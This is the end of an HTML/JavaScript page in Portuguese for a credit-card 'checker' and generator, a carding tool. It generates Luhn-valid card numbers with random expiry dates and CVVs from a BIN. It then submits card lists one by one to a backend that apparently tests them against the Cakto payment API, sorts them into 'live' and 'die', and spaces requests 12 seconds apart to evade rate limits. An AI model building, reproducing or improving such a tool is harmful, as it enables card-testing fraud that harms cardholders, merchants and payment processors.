            <button class="modal-close" onclick="fecharGerador()">&times;</button>
            <div class="modal-title">⚙️ Gerar Cartões</div>
            <div class="modal-gen">
                <div class="gen-left">
                    <label>BIN / Matriz</label>
                    <input type="text" id="genBin" placeholder="512267" maxlength="16" autocomplete="off">
                    <div class="date-row">
                        <div style="flex:1"><label>Mês</label><select id="genMonth"><option value="RND">MÊS</option></select></div>
                        <div style="flex:1"><label>Ano</label><select id="genYear"><option value="RND">ANO</option></select></div>
                    </div>
                    <label>CVV <span style="font-weight:400;color:var(--text-dim);text-transform:none;">(xxx = aleatório)</span></label>
                    <input type="text" id="genCvv" placeholder="xxx" maxlength="4" autocomplete="off">
                    <label>Quantidade</label>
                    <input type="number" id="genQty" value="10" min="1" max="1000">
                    <button class="btn" style="margin-top:14px;" onclick="gerarModal()">▶ GERAR</button>
                </div>
                <div class="gen-right">
                    <label>Cartões Gerados <span class="gen-count" id="genCount">0</span></label>
                    <textarea class="gen-result" id="genResult" placeholder="Os cartões aparecerão aqui..." readonly></textarea>
                    <div class="gen-actions">
                        <button class="btn-copy" onclick="copiarGerador()">Copiar</button>
                        <button class="btn-dl" onclick="baixarGerador()">Baixar .TXT</button>
                        <button class="btn-clear" onclick="limparGerador()">Limpar</button>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script>
        function iniciarChuva() {
            const canvas = document.getElementById('matrixRain');
            const ctx = canvas.getContext('2d');
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;

            const chars = '0123456789ABCDEF$#@%&*+|<>';
            const fonte = canvas.height / 26;
            const colunas = Math.floor(canvas.width / fonte);
            const drops = new Array(colunas).fill(1);

            function desenhar() {
                ctx.fillStyle = 'rgba(0, 0, 0, 0.08)';
                ctx.fillRect(0, 0, canvas.width, canvas.height);
                ctx.fillStyle = '#eb4039';
                ctx.font = fonte + 'px monospace';
                for (let i = 0; i < drops.length; i++) {
                    const ch = chars[Math.floor(Math.random() * chars.length)];
                    ctx.fillText(ch, i * fonte, drops[i] * fonte);
                    if (drops[i] * fonte > canvas.height && Math.random() > 0.975) {
                        drops[i] = 0;
                    }
                    drops[i]++;
                }
            }

            window.addEventListener('resize', () => {
                canvas.width = window.innerWidth;
                canvas.height = window.innerHeight;
            });

            setInterval(desenhar, 35);
        }
        iniciarChuva();

        const groups = { lives: [], dies: [], analise: [] };
        let isProcessing = false;

        var AUDIO_LIVE = 'data:audio/mpeg;base64,';
        var audioLive = null;
        function tocarLive() {
            if (!audioLive) {
                audioLive = new Audio(AUDIO_LIVE);
                audioLive.volume = 1;
            }
            audioLive.currentTime = 0;
            var p = audioLive.play();
            if (p && p.catch) p.catch(function() {});
        }
        document.addEventListener('click', function() {
            if (audioLive && audioLive.paused) {
                var p = audioLive.play();
                if (p && p.catch) p.catch(function() {});
            }
        });

        const cardInput = document.getElementById('cardInput');
        const listLives = document.getElementById('listLives');
        const listDies = document.getElementById('listDies');
        const listAnalise = document.getElementById('listAnalise');
        const btnExecutar = document.getElementById('btnExecutar');
        const loading = document.getElementById('loading');
        const progressWrap = document.getElementById('progressWrap');
        const progressFill = document.getElementById('progressFill');
        const progressText = document.getElementById('progressText');
        const progressStatus = document.getElementById('progressStatus');

        function esc(s) {
            return (s || '').replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
        }

        function mostrarToast(msg, tipo) {
            const t = document.getElementById('toast');
            t.textContent = msg;
            t.className = 'toast show' + (tipo ? ' ' + tipo : '');
            setTimeout(() => t.className = 'toast', 3500);
        }

        function renderizar() {
            function renderItem(r, cls) {
                var label = '';
                if (r.tipo === 'live_cvv') label = '<span style="color:var(--gold)">[LIVE CVV]</span> ';
                if (r.tipo === 'live_invalid') label = '<span style="color:var(--gold)">[LIVE INVALID DATA]</span> ';
                return '<div class="result-item ' + cls + '"><div class="r-card">' + label + esc(r.cartao) + '</div><div class="r-msg">' + esc(r.mensagem) + '</div><div class="r-time">' + r.tempo + 's</div></div>';
            }
            listLives.innerHTML = groups.lives.length
                ? groups.lives.map(r => renderItem(r, 'live')).join('')
                : '<div class="empty">Nenhuma live</div>';
            listDies.innerHTML = groups.dies.length
                ? groups.dies.map(r => renderItem(r, 'die')).join('')
                : '<div class="empty">Nenhuma die</div>';
            listAnalise.innerHTML = groups.analise.length
                ? groups.analise.map(r => renderItem(r, 'ana')).join('')
                : '<div class="empty">Nenhuma análise</div>';

            document.getElementById('countLives').textContent = groups.lives.length;
            document.getElementById('countDies').textContent = groups.dies.length;
            document.getElementById('countAnalise').textContent = groups.analise.length;
            document.getElementById('stLives').textContent = groups.lives.length;
            document.getElementById('stDies').textContent = groups.dies.length;
            document.getElementById('stAnalise').textContent = groups.analise.length;
            document.getElementById('stTotal').textContent = groups.lives.length + groups.dies.length + groups.analise.length;
        }

        async function verificarCartoes() {
            if (isProcessing) return;

            const linhas = cardInput.value.split('\n').map(l => l.trim()).filter(l => l);
            if (!linhas.length) {
                mostrarToast('Cole os cartões primeiro', 'error');
                return;
            }

            isProcessing = true;
            btnExecutar.disabled = true;
            btnExecutar.textContent = 'Executando...';
            loading.classList.add('active');
            progressWrap.classList.add('active');

            const total = linhas.length;
            for (let i = 0; i < total; i++) {
                const cartao = linhas[i];
                progressStatus.textContent = 'Verificando ' + (i + 1) + '/' + total + '...';
                progressFill.style.width = Math.round((i / total) * 100) + '%';
                progressText.textContent = Math.round((i / total) * 100) + '%';

                try {
                    const controller = new AbortController();
                    const timer = setTimeout(() => controller.abort(), 90000);
                    const resp = await fetch('api-caktohttp-lite.php', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ action: 'testar', card: cartao }),
                        signal: controller.signal
                    });
                    clearTimeout(timer);
                    const data = await resp.json();

                    const item = {
                        cartao: cartao,
                        mensagem: data.msg || data.error || '—',
                        tempo: data.tempo != null ? data.tempo : 0,
                        tipo: data.status === 'LIVE' ? 'live' : (data.status === 'DIE' ? 'die' : 'ana'),
                        copy: data.copy || null
                    };

                    if (data.status === 'LIVE') {
                        groups.lives.push(item);
                        tocarLive();
                    } else if (data.status === 'DIE') {
                        groups.dies.push(item);
                    } else {
                        groups.analise.push(item);
                    }
                    renderizar();
                } catch (e) {
                    mostrarToast('Erro de conexão: ' + cartao, 'error');
                }

                if (i < total - 1) {
                    progressStatus.textContent = 'Aguardando 12s (rate-limit MPI)...';
                    progressFill.style.width = Math.round(((i + 1) / total) * 100) + '%';
                    progressText.textContent = Math.round(((i + 1) / total) * 100) + '%';
                    await new Promise(r => setTimeout(r, 12000));
                }
            }

            progressFill.style.width = '100%';
            progressText.textContent = '100%';
            progressStatus.textContent = 'Concluído (' + groups.lives.length + ' live(s))';

            setTimeout(() => {
                loading.classList.remove('active');
                progressWrap.classList.remove('active');
                isProcessing = false;
                btnExecutar.disabled = false;
                btnExecutar.textContent = '▶ Rodar';
            }, 800);
        }

        function copiar(grupo) {
            const lista = groups[grupo];
            if (!lista.length) {
                mostrarToast('Nada para copiar', 'error');
                return;
            }
            const texto = lista.map(r => r.copy || r.cartao).join('\n');
            navigator.clipboard.writeText(texto).then(() => {
                mostrarToast(lista.length + ' cartões copiados!', 'success');
            }).catch(() => {
                const ta = document.createElement('textarea');
                ta.value = texto;
                document.body.appendChild(ta);
                ta.select();
                document.execCommand('copy');
                document.body.removeChild(ta);
                mostrarToast(lista.length + ' cartões copiados!', 'success');
            });
        }

        function adicionarExemplo() {
            cardInput.value = '4111111111111111|12|2026|123\n5555555555554444|10|2025|456';
            mostrarToast('Exemplo adicionado', 'success');
        }

        async function verDebug() {
            try {
                const resp = await fetch('api-caktohttp-lite.php?action=debug', { method: 'GET' });
                const data = await resp.json();
                const resumo =
                    'PHP: ' + data.php + '\n' +
                    'curl: ' + (data.curl ? 'OK' : 'FALTANDO!') + '\n' +
                    'storage: ' + data.storage + '\n' +
                    'storage gravável: ' + (data.storage_writable ? 'sim' : 'NÃO') + '\n' +
                    'private gravável: ' + (data.private_writable ? 'sim' : 'NÃO') + '\n' +
                    'gravação no log: ' + (data.ping_gravacao || '?') + '\n' +
                    'API Cakto: HTTP ' + (data.api_cakto ? data.api_cakto.http + ' em ' + data.api_cakto.tempo_ms + 'ms err=' + (data.api_cakto.err || '-') : 'sem teste') + '\n' +
                    (data.api_cakto && data.api_cakto.http !== 200 ? 'resposta: ' + data.api_cakto.resposta + '\n' : '') +
                    '\n=== LOG (últimas ' + (data.log_linhas || []).length + ') ===\n' +
                    (data.log_linhas || []).join('\n') + '\n\n' +
                    '=== ERROS ===\n' +
                    ((data.erros || []).join('\n') || '(nenhum)');
                document.getElementById('dbgOutput').value = resumo;
                document.getElementById('dbgModal').classList.add('show');
            } catch (e) {
                mostrarToast('Erro no debug: ' + e.message, 'error');
            }
        }

        function fecharDebug() {
            document.getElementById('dbgModal').classList.remove('show');
        }

        function copiarDebug() {
            const t = document.getElementById('dbgOutput');
            t.select();
            t.setSelectionRange(0, t.value.length);
            navigator.clipboard.writeText(t.value).then(() => {
                mostrarToast('Debug copiado!', 'success');
            }).catch(() => {
                document.execCommand('copy');
                mostrarToast('Debug copiado!', 'success');
            });
        }

        // ===== Gerador de Cartões =====
        function abrirGerador() {
            document.getElementById('genModal').classList.add('show');
        }

        function fecharGerador() {
            document.getElementById('genModal').classList.remove('show');
        }

        (function() {
            const m = document.getElementById('genMonth');
            for (let i = 1; i <= 12; i++) {
                const v = i.toString().padStart(2, '0');
                m.innerHTML += '<option value="' + v + '">' + v + '</option>';
            }
            const y = document.getElementById('genYear');
            const cy = new Date().getFullYear();
            for (let i = cy; i <= cy + 10; i++) {
                y.innerHTML += '<option value="' + i + '">' + i + '</option>';
            }
        })();

        function luhnGen(n) {
            let s = 0, a = false;
            for (let i = n.length - 1; i >= 0; i--) {
                let d = parseInt(n[i]);
                if (a) { d *= 2; if (d > 9) d -= 9; }
                s += d; a = !a;
            }
            return (10 - (s % 10)) % 10;
        }

        function gerarNumero(bin, len) {
            const num = [];
            for (let i = 0; i < len; i++) {
                if (i < bin.length) {
                    const c = bin[i];
                    if (c === 'x' || c === 'X') num.push(null);
                    else if (c >= '0' && c <= '9') num.push(c);
                    else continue;
                } else {
                    num.push(null);
                }
            }
            for (let i = 0; i < num.length; i++) {
                if (num[i] === null) num[i] = Math.floor(Math.random() * 10).toString();
            }
            const p = num.slice(0, -1).join('');
            num[num.length - 1] = luhnGen(p + '0').toString();
            return num.join('');
        }

        function gerarModal() {
            const bin = document.getElementById('genBin').value.trim().replace(/[^0-9x]/gi, '');
            if (!bin || bin.length < 2) {
                mostrarToast('Digite um BIN válido', 'error');
                return;
            }
            const m = document.getElementById('genMonth').value;
            const y = document.getElementById('genYear').value;
            const cvv = document.getElementById('genCvv').value.trim();
            const qty = parseInt(document.getElementById('genQty').value) || 10;
            const isAmex = bin[0] === '3';
            const len = isAmex ? 15 : 16;
            const cards = [];
            for (let i = 0; i < qty; i++) {
                const num = gerarNumero(bin, len);
                const mo = m === 'RND' ? (Math.floor(Math.random() * 12) + 1).toString().padStart(2, '0') : m;
                const yr = y === 'RND' ? (new Date().getFullYear() + Math.floor(Math.random() * 6) + 2).toString() : y;
                let cv = cvv.toUpperCase() === 'RND' || !cvv ? '' : cvv;
                if (!cv) {
                    for (let j = 0; j < (isAmex ? 4 : 3); j++) cv += Math.floor(Math.random() * 10);
                }
                cards.push(num + '|' + mo + '|' + yr + '|' + cv);
            }
            document.getElementById('genResult').value = cards.join('\n');
            document.getElementById('genCount').textContent = cards.length;
            mostrarToast(cards.length + ' cartões gerados', 'success');
        }

        function copiarGerador() {
            const t = document.getElementById('genResult').value;
            if (!t.trim()) {
                mostrarToast('Nada para copiar', 'error');
                return;
            }
            navigator.clipboard.writeText(t).then(() => {
                mostrarToast('Copiado!', 'success');
                fecharGerador();
            }).catch(() => {
                const ta = document.createElement('textarea');
                ta.value = t;
                document.body.appendChild(ta);
                ta.select();
                document.execCommand('copy');
                document.body.removeChild(ta);
                mostrarToast('Copiado!', 'success');
                fecharGerador();
            });
        }

        function baixarGerador() {
            const t = document.getElementById('genResult').value;
            if (!t.trim()) {
                mostrarToast('Nada para baixar', 'error');
                return;
            }
            const b = new Blob([t], { type: 'text/plain' });
            const a = document.createElement('a');
            a.href = URL.createObjectURL(b);
            a.download = 'cards_' + Date.now() + '.txt';
            a.click();
            URL.revokeObjectURL(a.href);
            mostrarToast('Baixado!', 'success');
        }

        function limparGerador() {
            document.getElementById('genResult').value = '';
            document.getElementById('genCount').textContent = '0';
        }

        document.addEventListener('keydown', (e) => {
            if ((e.ctrlKey || e.metaKey) && e.key === 'Enter') {
                e.preventDefault();
                if (document.getElementById('genModal').classList.contains('show')) {
                    gerarModal();
                } else {
                    verificarCartoes();
                }
            }
            if (e.key === 'Escape') { fecharGerador(); fecharDebug(); }
        });
    </script>
</body>
</html>
